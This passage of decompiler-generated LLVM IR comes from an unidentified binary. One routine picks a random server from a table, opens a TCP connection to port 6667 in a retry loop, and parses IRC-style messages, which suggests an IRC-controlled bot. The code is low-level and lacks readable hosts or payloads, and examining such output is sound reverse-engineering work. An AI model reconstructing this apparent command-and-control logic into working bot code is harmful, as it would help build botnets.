  br i1 %v2_100039b4, label %dec_label_pc_100039bc, label %dec_label_pc_100039dc

dec_label_pc_100039bc:                            ; preds = %dec_label_pc_100039a4.preheader, %dec_label_pc_10003998
  %storemerge845 = phi i32 [ %v1_1000399c, %dec_label_pc_10003998 ], [ 0, %dec_label_pc_100039a4.preheader ]
  %v2_100039c8 = add i32 %storemerge845, %v1_10003954
  %v1_100039cc = inttoptr i32 %v2_100039c8 to i8*
  %v2_100039cc = load i8, i8* %v1_100039cc, align 1
  %v3_100039d4 = icmp eq i8 %v2_100039cc, 32
  br i1 %v3_100039d4, label %dec_label_pc_100039dc, label %dec_label_pc_10003998

dec_label_pc_100039dc:                            ; preds = %dec_label_pc_10003998, %dec_label_pc_100039bc, %dec_label_pc_100039a4.preheader
  %storemerge8.lcssa = phi i32 [ 0, %dec_label_pc_100039a4.preheader ], [ %v1_1000399c, %dec_label_pc_10003998 ], [ %storemerge845, %dec_label_pc_100039bc ]
  %v2_100039e8 = add i32 %storemerge8.lcssa, %v1_10003954
  %v3_100039f0 = inttoptr i32 %v2_100039e8 to i8*
  store i8 0, i8* %v3_100039f0, align 1
  %v3_100039f8 = load i32, i32* @global_var_10010474.145, align 4
  store i32 %v1_10003954, i32* @r3, align 4
  store i32 %v3_100039f8, i32* @r4, align 4
  %v3_10003a04 = call i32 @function_10007360(i32 %v1_10003954, i32 %v3_100039f8)
  %v3_10003a0c = icmp eq i32 %v3_10003a04, 0
  br i1 %v3_10003a0c, label %dec_label_pc_10003a14, label %dec_label_pc_10003c2c

dec_label_pc_10003a14:                            ; preds = %dec_label_pc_100039dc
  %v3_10003a18 = load i32, i32* @global_var_10010464.16, align 4
  %v3_10003a1c = icmp eq i32 %v3_10003a18, 0
  br i1 %v3_10003a1c, label %dec_label_pc_10003a24, label %dec_label_pc_10003c2c

dec_label_pc_10003a24:                            ; preds = %dec_label_pc_10003a14
  br label %dec_label_pc_10003a58.preheader

dec_label_pc_10003a40:                            ; preds = %dec_label_pc_10003a70
  %v4_10003a70 = ptrtoint i8* %stack_var_-68.232 to i32
  %v1_10003a44 = add i32 %v4_10003a70, 1
  %v5_10003a48 = inttoptr i32 %v1_10003a44 to i8*
  %v1_10003a50 = add i32 %stack_var_-60.231, 1
  store i32 %v1_10003a50, i32* %r29.global-to-local, align 4
  store i32 %tmp, i32* @r3, align 4
  %v0_10003a60 = call i32 @function_10006ed8()
  %v0_10003a68 = load i32, i32* %r29.global-to-local, align 4
  %v2_10003a68 = icmp ult i32 %v0_10003a68, %v0_10003a60
  br i1 %v2_10003a68, label %dec_label_pc_10003a70, label %dec_label_pc_10003a84

dec_label_pc_10003a70:                            ; preds = %dec_label_pc_10003a58.preheader, %dec_label_pc_10003a40
  %stack_var_-68.232 = phi i8* [ %v5_10003a48, %dec_label_pc_10003a40 ], [ %stack_var_-68.338, %dec_label_pc_10003a58.preheader ]
  %stack_var_-60.231 = phi i32 [ %v1_10003a50, %dec_label_pc_10003a40 ], [ %stack_var_-60.337, %dec_label_pc_10003a58.preheader ]
  %v2_10003a74 = load i8, i8* %stack_var_-68.232, align 1
  %v3_10003a7c = icmp eq i8 %v2_10003a74, 32
  br i1 %v3_10003a7c, label %dec_label_pc_10003a84, label %dec_label_pc_10003a40

dec_label_pc_10003a84:                            ; preds = %dec_label_pc_10003a40, %dec_label_pc_10003a70, %dec_label_pc_10003a58.preheader
  %stack_var_-60.2.lcssa = phi i32 [ %stack_var_-60.337, %dec_label_pc_10003a58.preheader ], [ %v1_10003a50, %dec_label_pc_10003a40 ], [ %stack_var_-60.231, %dec_label_pc_10003a70 ]
  %stack_var_-68.2.lcssa = phi i8* [ %stack_var_-68.338, %dec_label_pc_10003a58.preheader ], [ %v5_10003a48, %dec_label_pc_10003a40 ], [ %stack_var_-68.232, %dec_label_pc_10003a70 ]
  %v4_10003a84 = ptrtoint i8* %stack_var_-68.2.lcssa to i32
  %v1_10003a88 = add i32 %v4_10003a84, 1
  store i32 %stack_var_-60.2.lcssa, i32* %r29.global-to-local, align 4
  store i32 %tmp, i32* @r3, align 4
  %v0_10003a98 = call i32 @function_10006ed8()
  %v0_10003aa0 = load i32, i32* %r29.global-to-local, align 4
  %v4_10003aa0 = icmp eq i32 %v0_10003aa0, %v0_10003a98
  br i1 %v4_10003aa0, label %dec_label_pc_10003c2c, label %dec_label_pc_10003aa8

dec_label_pc_10003aa8:                            ; preds = %dec_label_pc_10003a84
  %v5_10003a8c = inttoptr i32 %v1_10003a88 to i8*
  %v1_10003aac = add nuw nsw i32 %storemerge939, 1
  %tmp91 = icmp slt i32 %v1_10003aac, 3
  br i1 %tmp91, label %dec_label_pc_10003a58.preheader, label %dec_label_pc_10003ad8.preheader

dec_label_pc_10003a58.preheader:                  ; preds = %dec_label_pc_10003a24, %dec_label_pc_10003aa8
  %storemerge939 = phi i32 [ 0, %dec_label_pc_10003a24 ], [ %v1_10003aac, %dec_label_pc_10003aa8 ]
  %stack_var_-68.338 = phi i8* [ %arg3, %dec_label_pc_10003a24 ], [ %v5_10003a8c, %dec_label_pc_10003aa8 ]
  %stack_var_-60.337 = phi i32 [ 0, %dec_label_pc_10003a24 ], [ %stack_var_-60.2.lcssa, %dec_label_pc_10003aa8 ]
  store i32 %stack_var_-60.337, i32* %r29.global-to-local, align 4
  store i32 %tmp, i32* @r3, align 4
  %v0_10003a6026 = call i32 @function_10006ed8()
  %v0_10003a6827 = load i32, i32* %r29.global-to-local, align 4
  %v2_10003a6828 = icmp ult i32 %v0_10003a6827, %v0_10003a6026
  br i1 %v2_10003a6828, label %dec_label_pc_10003a70, label %dec_label_pc_10003a84

dec_label_pc_10003ad8.preheader:                  ; preds = %dec_label_pc_10003aa8
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 %v1_10003a88, i32* @r3, align 4
  %v0_10003ae017 = call i32 @function_10006ed8()
  %v0_10003ae818 = load i32, i32* %r29.global-to-local, align 4
  %v2_10003ae819 = icmp ult i32 %v0_10003ae818, %v0_10003ae017
  br i1 %v2_10003ae819, label %dec_label_pc_10003af0, label %dec_label_pc_10003b10

dec_label_pc_10003acc:                            ; preds = %dec_label_pc_10003af0
  %v1_10003ad0 = add i32 %storemerge1022, 1
  store i32 %v1_10003ad0, i32* %r29.global-to-local, align 4
  store i32 %v1_10003a88, i32* @r3, align 4
  %v0_10003ae0 = call i32 @function_10006ed8()
  %v0_10003ae8 = load i32, i32* %r29.global-to-local, align 4
  %v2_10003ae8 = icmp ult i32 %v0_10003ae8, %v0_10003ae0
  br i1 %v2_10003ae8, label %dec_label_pc_10003af0, label %dec_label_pc_10003b10

dec_label_pc_10003af0:                            ; preds = %dec_label_pc_10003ad8.preheader, %dec_label_pc_10003acc
  %storemerge1022 = phi i32 [ %v1_10003ad0, %dec_label_pc_10003acc ], [ 0, %dec_label_pc_10003ad8.preheader ]
  %v2_10003afc = add i32 %storemerge1022, %v1_10003a88
  %v1_10003b00 = inttoptr i32 %v2_10003afc to i8*
  %v2_10003b00 = load i8, i8* %v1_10003b00, align 1
  %v3_10003b08 = icmp eq i8 %v2_10003b00, 32
  br i1 %v3_10003b08, label %dec_label_pc_10003b10, label %dec_label_pc_10003acc

dec_label_pc_10003b10:                            ; preds = %dec_label_pc_10003acc, %dec_label_pc_10003af0, %dec_label_pc_10003ad8.preheader
  %storemerge10.lcssa = phi i32 [ 0, %dec_label_pc_10003ad8.preheader ], [ %v1_10003ad0, %dec_label_pc_10003acc ], [ %storemerge1022, %dec_label_pc_10003af0 ]
  %v2_10003b1c = add i32 %storemerge10.lcssa, %v1_10003a88
  %v3_10003b24 = inttoptr i32 %v2_10003b1c to i8*
  store i8 0, i8* %v3_10003b24, align 1
  store i32 268450608, i32* @lr, align 4
  %v2_10003b2c = call i32 @function_10007770(i32 %v1_10003a88)
  %v5_10003b34 = trunc i32 %v2_10003b2c to i8
  store i8 %v5_10003b34, i8* %stack_var_-56, align 1
  %v4_10003b40 = icmp eq i8 %v5_10003b34, -1
  br i1 %v4_10003b40, label %dec_label_pc_10003b48, label %dec_label_pc_10003bb4

dec_label_pc_10003b48:                            ; preds = %dec_label_pc_10003b10
  store i32 268450640, i32* @lr, align 4
  %v3_10003b4c = call i32 @function_100077a4(i32 %v1_10003a88, i32 %v2_10003b2c)
  %v3_10003b5c = icmp eq i32 %v3_10003b4c, 0
  br i1 %v3_10003b5c, label %dec_label_pc_10003b64, label %dec_label_pc_10003b88

dec_label_pc_10003b64:                            ; preds = %dec_label_pc_10003b48
  %v3_10003b68 = load i32, i32* @global_var_10010488.143, align 4
  %v5_10003b80 = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([93 x i8]* @global_var_1000dc58.163 to i32), i32 %v3_10003b68, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  br label %dec_label_pc_10003c2c

dec_label_pc_10003b88:                            ; preds = %dec_label_pc_10003b48
  %v2_10003b88 = ptrtoint i8* %stack_var_-56 to i32
  %v1_10003b90 = add i32 %v3_10003b4c, 16
  %v2_10003b90 = inttoptr i32 %v1_10003b90 to i32*
  %v3_10003b90 = load i32, i32* %v2_10003b90, align 4
  %v1_10003b94 = inttoptr i32 %v3_10003b90 to i32*
  %v2_10003b94 = load i32, i32* %v1_10003b94, align 4
  %v1_10003b9c = add i32 %v3_10003b4c, 12
  %v2_10003b9c = inttoptr i32 %v1_10003b9c to i32*
  %v3_10003b9c = load i32, i32* %v2_10003b9c, align 4
  store i32 %v2_10003b88, i32* @r3, align 4
  store i32 %v2_10003b94, i32* @r4, align 4
  store i32 %v3_10003b9c, i32* @r5, align 4
  store i32 268450740, i32* @lr, align 4
  %v0_10003bb0 = call i32 @function_10006d8c()
  %v2_10003bc4.pre = load i8, i8* %stack_var_-56, align 1
  br label %dec_label_pc_10003bb4

dec_label_pc_10003bb4:                            ; preds = %dec_label_pc_10003b10, %dec_label_pc_10003b88
  %v0_10003c4474 = phi i32 [ %v0_10003bb0, %dec_label_pc_10003b88 ], [ %v2_10003b2c, %dec_label_pc_10003b10 ]
  %v2_10003bc4 = phi i8 [ %v2_10003bc4.pre, %dec_label_pc_10003b88 ], [ %v5_10003b34, %dec_label_pc_10003b10 ]
  store i8 %v2_10003bc4, i8* bitcast (i8** @global_var_10010463.165 to i8*), align 4
  store i8 0, i8* bitcast (i8** @global_var_10010460.15 to i8*), align 4
  store i32 256, i32* @global_var_10010464.16, align 4
  br label %dec_label_pc_10003c2c

dec_label_pc_10003c2c:                            ; preds = %dec_label_pc_10003950, %dec_label_pc_10003a84, %dec_label_pc_10003a14, %dec_label_pc_100039dc, %dec_label_pc_10003b64, %dec_label_pc_10003bb4
  %v0_10003c44 = phi i32 [ 0, %dec_label_pc_10003a14 ], [ %v3_10003a04, %dec_label_pc_100039dc ], [ %v5_10003b80, %dec_label_pc_10003b64 ], [ %v0_10003c4474, %dec_label_pc_10003bb4 ], [ %v0_10003a98, %dec_label_pc_10003a84 ], [ %v0_10003964, %dec_label_pc_10003950 ]
  %v2_10003c2c = load i32, i32* %stack_var_-80, align 4
  %v1_10003c38 = add i32 %v2_10003c2c, -12
  %v2_10003c38 = inttoptr i32 %v1_10003c38 to i32*
  %v3_10003c38 = load i32, i32* %v2_10003c38, align 4
  store i32 %v3_10003c38, i32* %r29.global-to-local, align 4
  ret i32 %v0_10003c44

; uselistorder directives
  uselistorder i32 %v2_10003b2c, { 1, 0, 2 }
  uselistorder i32 %stack_var_-60.337, { 2, 0, 1 }
  uselistorder i32 %v1_10003aac, { 1, 0 }
  uselistorder i32 %v1_10003a88, { 2, 3, 0, 1, 5, 4, 6 }
  uselistorder i32 %stack_var_-60.161, { 2, 0, 1 }
  uselistorder i32 %v1_10003978, { 1, 0 }
  uselistorder i32 %v1_10003954, { 3, 2, 0, 1, 5, 4, 6 }
  uselistorder i32 %tmp, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32* %r29.global-to-local, { 0, 1, 2, 15, 16, 17, 18, 3, 4, 5, 6, 7, 8, 19, 20, 13, 14, 9, 10, 11, 12 }
  uselistorder i8** @global_var_10010460.15, { 0, 4, 3, 2, 1 }
  uselistorder i32* @global_var_10010464.16, { 1, 2, 0, 3, 4, 5, 6 }
  uselistorder i8* %arg3, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10003c2c, { 5, 4, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_10003bb4, { 1, 0 }
  uselistorder label %dec_label_pc_10003b10, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10003af0, { 1, 0 }
  uselistorder label %dec_label_pc_10003a58.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_10003a84, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100039dc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_100039bc, { 1, 0 }
  uselistorder label %dec_label_pc_10003924.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_10003950, { 2, 1, 0 }
}

define i32 @function_10003c48(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10003c48:
  %v3_10003c6c = load i32, i32* @global_var_10010474.145, align 4
  store i32 268450936, i32* @lr, align 4
  %v1_10003c74 = call i32 @function_10007e48(i32 %v3_10003c6c)
  store i32 268450940, i32* @lr, align 4
  %v0_10003c78 = call i32 @function_100007d4()
  store i32 %v0_10003c78, i32* @global_var_10010474.145, align 4
  ret i32 %v0_10003c78
}

define i32 @function_10003ca0(i32 %arg1, i32 %arg2, i8* %arg3) local_unnamed_addr {
dec_label_pc_10003ca0:
  %tmp = ptrtoint i8* %arg3 to i32
  store i32 %arg2, i32* @r3, align 4
  %v0_10003ce43 = call i32 @function_10006ed8()
  %v2_10003cec5 = icmp eq i32 %v0_10003ce43, 0
  br i1 %v2_10003cec5, label %dec_label_pc_10003d14, label %dec_label_pc_10003cf4

dec_label_pc_10003cd0:                            ; preds = %dec_label_pc_10003cf4
  %v1_10003cd4 = add i32 %storemerge28, 1
  store i32 %arg2, i32* @r3, align 4
  %v0_10003ce4 = call i32 @function_10006ed8()
  %v2_10003cec = icmp ult i32 %v1_10003cd4, %v0_10003ce4
  br i1 %v2_10003cec, label %dec_label_pc_10003cf4, label %dec_label_pc_10003d14

dec_label_pc_10003cf4:                            ; preds = %dec_label_pc_10003ca0, %dec_label_pc_10003cd0
  %storemerge28 = phi i32 [ %v1_10003cd4, %dec_label_pc_10003cd0 ], [ 0, %dec_label_pc_10003ca0 ]
  %v2_10003d00 = add i32 %storemerge28, %arg2
  %v1_10003d04 = inttoptr i32 %v2_10003d00 to i8*
  %v2_10003d04 = load i8, i8* %v1_10003d04, align 1
  %v3_10003d0c = icmp eq i8 %v2_10003d04, 33
  br i1 %v3_10003d0c, label %dec_label_pc_10003d14, label %dec_label_pc_10003cd0

dec_label_pc_10003d14:                            ; preds = %dec_label_pc_10003ca0, %dec_label_pc_10003cd0, %dec_label_pc_10003cf4
  %storemerge2.lcssa = phi i32 [ 0, %dec_label_pc_10003ca0 ], [ %v1_10003cd4, %dec_label_pc_10003cd0 ], [ %storemerge28, %dec_label_pc_10003cf4 ]
  %v2_10003d20 = add i32 %storemerge2.lcssa, %arg2
  %v3_10003d28 = inttoptr i32 %v2_10003d20 to i8*
  store i8 0, i8* %v3_10003d28, align 1
  %v3_10003d30 = load i32, i32* @global_var_10010474.145, align 4
  store i32 %arg2, i32* @r3, align 4
  store i32 %v3_10003d30, i32* @r4, align 4
  %v2_10003d3c = call i32 @function_10007360(i32 %arg2, i32 %v3_10003d30)
  %v3_10003d44 = icmp eq i32 %v2_10003d3c, 0
  br i1 %v3_10003d44, label %dec_label_pc_10003d4c, label %dec_label_pc_10003da0

dec_label_pc_10003d4c:                            ; preds = %dec_label_pc_10003d14
  %v2_10003d50 = load i8, i8* %arg3, align 1
  %v3_10003d58 = icmp eq i8 %v2_10003d50, 58
  br i1 %v3_10003d58, label %dec_label_pc_10003d60, label %dec_label_pc_10003d6c

dec_label_pc_10003d60:                            ; preds = %dec_label_pc_10003d4c
  %v1_10003d64 = add i32 %tmp, 1
  %v5_10003d68 = inttoptr i32 %v1_10003d64 to i8*
  br label %dec_label_pc_10003d6c

dec_label_pc_10003d6c:                            ; preds = %dec_label_pc_10003d4c, %dec_label_pc_10003d60
  %stack_var_-32.0 = phi i8* [ %v5_10003d68, %dec_label_pc_10003d60 ], [ %arg3, %dec_label_pc_10003d4c ]
  %v3_10003d70 = load i32, i32* @global_var_10010474.145, align 4
  %v3_10003d74 = icmp eq i32 %v3_10003d70, 0
  br i1 %v3_10003d74, label %dec_label_pc_10003d8c, label %dec_label_pc_10003d7c

dec_label_pc_10003d7c:                            ; preds = %dec_label_pc_10003d6c
  store i32 268451212, i32* @lr, align 4
  %v1_10003d88 = call i32 @function_10007e48(i32 %v3_10003d70)
  br label %dec_label_pc_10003d8c

dec_label_pc_10003d8c:                            ; preds = %dec_label_pc_10003d6c, %dec_label_pc_10003d7c
  %v4_10003d8c = ptrtoint i8* %stack_var_-32.0 to i32
  store i32 268451220, i32* @lr, align 4
  %v2_10003d90 = call i32 @function_100073b0(i32 %v4_10003d8c)
  store i32 %v2_10003d90, i32* @global_var_10010474.145, align 4
  br label %dec_label_pc_10003da0

dec_label_pc_10003da0:                            ; preds = %dec_label_pc_10003d14, %dec_label_pc_10003d8c
  %v0_10003db8 = phi i32 [ %v2_10003d3c, %dec_label_pc_10003d14 ], [ %v2_10003d90, %dec_label_pc_10003d8c ]
  ret i32 %v0_10003db8

; uselistorder directives
  uselistorder i32 %v1_10003cd4, { 1, 2, 0 }
  uselistorder i32 %arg2, { 4, 3, 0, 1, 5, 2 }
  uselistorder label %dec_label_pc_10003da0, { 1, 0 }
  uselistorder label %dec_label_pc_10003d8c, { 1, 0 }
  uselistorder label %dec_label_pc_10003d6c, { 1, 0 }
  uselistorder label %dec_label_pc_10003d14, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10003cf4, { 1, 0 }
}

define i32 @function_10003dbc() local_unnamed_addr {
dec_label_pc_10003dbc:
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v2_10003ef4 = ptrtoint i32* %stack_var_-28 to i32
  %v2_10003ef8 = ptrtoint i32* %stack_var_-24 to i32
  %v2_10003f50 = ptrtoint i32* %stack_var_-12 to i32
  br label %dec_label_pc_10003dd4

dec_label_pc_10003dd4:                            ; preds = %dec_label_pc_10003dd4.backedge, %dec_label_pc_10003dbc
  store i32 -1, i32* @global_var_10010478.10, align 4
  store i32 1, i32* %stack_var_-12, align 4
  %v3_10003dec = load i32, i32* @global_var_10010458.107, align 4
  %v3_10003df0 = icmp eq i32 %v3_10003dec, 0
  br i1 %v3_10003df0, label %dec_label_pc_10003df8, label %dec_label_pc_10003e30

dec_label_pc_10003df8:                            ; preds = %dec_label_pc_10003dd4
  store i32 268451324, i32* @lr, align 4
  %v0_10003df8 = call i32 @function_1000815c()
  %v3_10003e04 = load i32, i32* @global_var_10010410.168, align 4
  %v2_10003e08 = srem i32 %v0_10003df8, %v3_10003e04
  %v1_10003e1c = mul i32 %v2_10003e08, 4
  %v2_10003e20 = add i32 %v1_10003e1c, ptrtoint ([16 x i8]** @global_var_10010414.170 to i32)
  %v1_10003e24 = inttoptr i32 %v2_10003e20 to i32*
  %v2_10003e24 = load i32, i32* %v1_10003e24, align 4
  store i32 %v2_10003e24, i32* @global_var_10010480.106, align 4
  br label %dec_label_pc_10003e30

dec_label_pc_10003e30:                            ; preds = %dec_label_pc_10003dd4, %dec_label_pc_10003df8
  store i32 0, i32* @global_var_10010458.107, align 4
  br label %dec_label_pc_10003e3c

dec_label_pc_10003e3c:                            ; preds = %dec_label_pc_10003e3c, %dec_label_pc_10003e30
  store i32 268451404, i32* @lr, align 4
  %v3_10003e48 = call i32 @function_10007cbc(i32 2, i32 1, i32 6)
  store i32 %v3_10003e48, i32* @global_var_10010478.10, align 4
  %v1_10003e60 = icmp slt i32 %v3_10003e48, 0
  br i1 %v1_10003e60, label %dec_label_pc_10003e3c, label %dec_label_pc_10003e68

dec_label_pc_10003e68:                            ; preds = %dec_label_pc_10003e3c
  %v3_10003e6c = load i32, i32* @global_var_10010480.106, align 4
  store i32 268451448, i32* @lr, align 4
  %v1_10003e74 = call i32 @function_10007770(i32 %v3_10003e6c)
  %v3_10003e7c = icmp eq i32 %v1_10003e74, 0
  br i1 %v3_10003e7c, label %dec_label_pc_10003ea4, label %dec_label_pc_10003e84

dec_label_pc_10003e84:                            ; preds = %dec_label_pc_10003e68
  %v3_10003e88 = load i32, i32* @global_var_10010480.106, align 4
  store i32 268451476, i32* @lr, align 4
  %v1_10003e90 = call i32 @function_10007770(i32 %v3_10003e88)
  %v4_10003e9c = icmp eq i32 %v1_10003e90, -1
  br i1 %v4_10003e9c, label %dec_label_pc_10003ea4, label %dec_label_pc_10003f18

dec_label_pc_10003ea4:                            ; preds = %dec_label_pc_10003e84, %dec_label_pc_10003e68
  %v3_10003ea8 = load i32, i32* @global_var_10010480.106, align 4
  store i32 268451508, i32* @lr, align 4
  %v2_10003eb0 = call i32 @function_100077a4(i32 %v3_10003ea8, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  %v3_10003ec0 = icmp eq i32 %v2_10003eb0, 0
  br i1 %v3_10003ec0, label %dec_label_pc_10003ec8, label %dec_label_pc_10003ee8

dec_label_pc_10003ec8:                            ; preds = %dec_label_pc_10003ea4
  store i32 0, i32* @global_var_10010480.106, align 4
  %v3_10003ed8 = load i32, i32* @global_var_10010478.10, align 4
  store i32 268451556, i32* @lr, align 4
  %v1_10003ee0 = call i32 @function_100048e0(i32 %v3_10003ed8)
  br label %dec_label_pc_10003dd4.backedge

dec_label_pc_10003dd4.backedge:                   ; preds = %dec_label_pc_10003ec8, %dec_label_pc_10004080
  br label %dec_label_pc_10003dd4

dec_label_pc_10003ee8:                            ; preds = %dec_label_pc_10003ea4
  %v1_10003eec = add i32 %v2_10003eb0, 16
  %v2_10003eec = inttoptr i32 %v1_10003eec to i32*
  %v3_10003eec = load i32, i32* %v2_10003eec, align 4
  %v1_10003ef0 = inttoptr i32 %v3_10003eec to i32*
  %v2_10003ef0 = load i32, i32* %v1_10003ef0, align 4
  %v1_10003f00 = add i32 %v2_10003eb0, 12
  %v2_10003f00 = inttoptr i32 %v1_10003f00 to i32*
  %v3_10003f00 = load i32, i32* %v2_10003f00, align 4
  store i32 %v3_10003f00, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_10003f14.171 to i32), i32* @lr, align 4
  %v4_10003f10 = call i32 @function_10007350(i32 %v2_10003ef0, i32 %v2_10003ef8, i32 %v3_10003f00, i32 %v2_10003eb0)
  br label %dec_label_pc_10003f30

dec_label_pc_10003f18:                            ; preds = %dec_label_pc_10003e84
  %v3_10003f1c = load i32, i32* @global_var_10010480.106, align 4
  store i32 268451624, i32* @lr, align 4
  %v1_10003f24 = call i32 @function_10007770(i32 %v3_10003f1c)
  store i32 %v1_10003f24, i32* %stack_var_-24, align 4
  br label %dec_label_pc_10003f30

dec_label_pc_10003f30:                            ; preds = %dec_label_pc_10003ee8, %dec_label_pc_10003f18
  store i32 2, i32* %stack_var_-28, align 4
  store i32 6667, i32* @r3, align 4
  %v1_10003f3c = call i32 @function_10007644(i32 6667)
  %v3_10003f4c = load i32, i32* @global_var_10010478.10, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10003f6c.172 to i32), i32* @lr, align 4
  %v3_10003f68 = call i32 @function_100047f8(i32 %v3_10003f4c, i32 -2147195266, i32 %v2_10003f50)
  store i32 268451700, i32* @lr, align 4
  %v1_10003f70 = call i32 @function_10004a90(i32 0)
  store i32 268451944, i32* @lr, align 4
  %v1_1000406411 = call i32 @function_10004a90(i32 0)
  %v2_1000407412 = sub i32 %v1_1000406411, %v1_10003f70
  %tmp1016 = icmp ult i32 %v2_1000407412, 10
  br i1 %tmp1016, label %dec_label_pc_10003f80, label %dec_label_pc_10004080

dec_label_pc_10003f80:                            ; preds = %dec_label_pc_10003f30, %dec_label_pc_10004058
  %v0_10003f80 = call i32 @function_10004b48()
  %v2_10003f8c = inttoptr i32 %v0_10003f80 to i32*
  store i32 0, i32* %v2_10003f8c, align 4
  %v3_10003f94 = load i32, i32* @global_var_10010478.10, align 4
  store i32 268451756, i32* @lr, align 4
  %v3_10003fa8 = call i32 @function_10007ba4(i32 %v3_10003f94, i32 %v2_10003ef4, i32 16)
  %v3_10003fb0 = icmp eq i32 %v3_10003fa8, 0
  br i1 %v3_10003fb0, label %dec_label_pc_10003fcc, label %dec_label_pc_10003fb8

dec_label_pc_10003fb8:                            ; preds = %dec_label_pc_10003f80
  %v0_10003fb8 = call i32 @function_10004b48()
  %v1_10003fc0 = inttoptr i32 %v0_10003fb8 to i32*
  %v2_10003fc0 = load i32, i32* %v1_10003fc0, align 4
  %v3_10003fc4 = icmp eq i32 %v2_10003fc0, 106
  br i1 %v3_10003fc4, label %dec_label_pc_10003fcc, label %dec_label_pc_10004030

dec_label_pc_10003fcc:                            ; preds = %dec_label_pc_10003fb8, %dec_label_pc_10003f80
  %v3_10003fd0 = load i32, i32* @global_var_10010478.10, align 4
  store i32 268451820, i32* @lr, align 4
  %v6_10003fe8 = call i32 @function_10007c80(i32 %v3_10003fd0, i32 1, i32 13, i32 0, i32 0, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  %v3_10003ff0 = load i32, i32* @global_var_10010478.10, align 4
  store i32 268451852, i32* @lr, align 4
  %v6_10004008 = call i32 @function_10007c80(i32 %v3_10003ff0, i32 1, i32 2, i32 0, i32 0, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  %v3_10004010 = load i32, i32* @global_var_10010478.10, align 4
  store i32 ptrtoint (i32* @global_var_1000402c.173 to i32), i32* @lr, align 4
  %v6_10004028 = call i32 @function_10007c80(i32 %v3_10004010, i32 1, i32 9, i32 0, i32 0, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  ret i32 %v6_10004028

dec_label_pc_10004030:                            ; preds = %dec_label_pc_10003fb8
  %v0_10004030 = call i32 @function_10004b48()
  %v1_10004038 = inttoptr i32 %v0_10004030 to i32*
  %v2_10004038 = load i32, i32* %v1_10004038, align 4
  %v3_1000403c = icmp eq i32 %v2_10004038, 115
  br i1 %v3_1000403c, label %dec_label_pc_10004058, label %dec_label_pc_10004044

dec_label_pc_10004044:                            ; preds = %dec_label_pc_10004030
  %v0_10004044 = call i32 @function_10004b48()
  %v1_1000404c = inttoptr i32 %v0_10004044 to i32*
  %v2_1000404c = load i32, i32* %v1_1000404c, align 4
  %v3_10004050 = icmp eq i32 %v2_1000404c, 114
  br i1 %v3_10004050, label %dec_label_pc_10004058, label %dec_label_pc_10004080

dec_label_pc_10004058:                            ; preds = %dec_label_pc_10004044, %dec_label_pc_10004030
  store i32 ptrtoint ([3 x i8]* @global_var_10004060.174 to i32), i32* @lr, align 4
  %v1_1000405c = call i32 @function_10008a14(i32 1)
  store i32 268451944, i32* @lr, align 4
  %v1_10004064 = call i32 @function_10004a90(i32 0)
  %v2_10004074 = sub i32 %v1_10004064, %v1_10003f70
  %tmp10 = icmp ult i32 %v2_10004074, 10
  br i1 %tmp10, label %dec_label_pc_10003f80, label %dec_label_pc_10004080

dec_label_pc_10004080:                            ; preds = %dec_label_pc_10004058, %dec_label_pc_10004044, %dec_label_pc_10003f30
  store i32 0, i32* @global_var_10010480.106, align 4
  %v3_10004090 = load i32, i32* @global_var_10010478.10, align 4
  store i32 268451996, i32* @lr, align 4
  %v1_10004098 = call i32 @function_100048e0(i32 %v3_10004090)
  br label %dec_label_pc_10003dd4.backedge

; uselistorder directives
  uselistorder i32 %v1_10003f70, { 1, 0 }
  uselistorder i32 %v3_10003f00, { 1, 0 }
  uselistorder i32 %v2_10003eb0, { 1, 0, 2, 3 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @function_10007c80, { 2, 1, 0 }
  uselistorder i32 268451944, { 1, 0 }
  uselistorder i32 (i32)* @function_10007644, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @function_10007350, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32)* @function_100077a4, { 3, 2, 1, 0 }
  uselistorder i32 ()* @function_1000815c, { 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_10003f80, { 1, 0 }
  uselistorder label %dec_label_pc_10003f30, { 1, 0 }
  uselistorder label %dec_label_pc_10003dd4.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_10003e30, { 1, 0 }
}

define i32 @function_100040b8(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_100040b8:
  %tmp = ptrtoint i32* %arg2 to i32
  %stack_var_-6180 = alloca i32, align 4
  %stack_var_-5156 = alloca i32, align 4
  %stack_var_-4132 = alloca i32, align 4
  %stack_var_-6316 = alloca i32, align 4
  %stack_var_-6616 = alloca i32, align 4
  %stack_var_-6308 = alloca i32, align 4
  store i32 268452060, i32* @lr, align 4
  %v0_100040d8 = call i32 @function_10004928()
  %v3_100040e0 = icmp eq i32 %v0_100040d8, 0
  br i1 %v3_100040e0, label %dec_label_pc_100040f0, label %dec_label_pc_100040e8

dec_label_pc_100040e8:                            ; preds = %dec_label_pc_100040b8
  %v0_100040ec = call i32 @function_1000885c()
  br label %dec_label_pc_100040f0

dec_label_pc_100040f0:                            ; preds = %dec_label_pc_100040b8, %dec_label_pc_100040e8
  %v2_100040f4 = load i32, i32* %arg2, align 4
  store i32 %v2_100040f4, i32* @r3, align 4
  %v0_10004104 = call i32 @function_10006ed8()
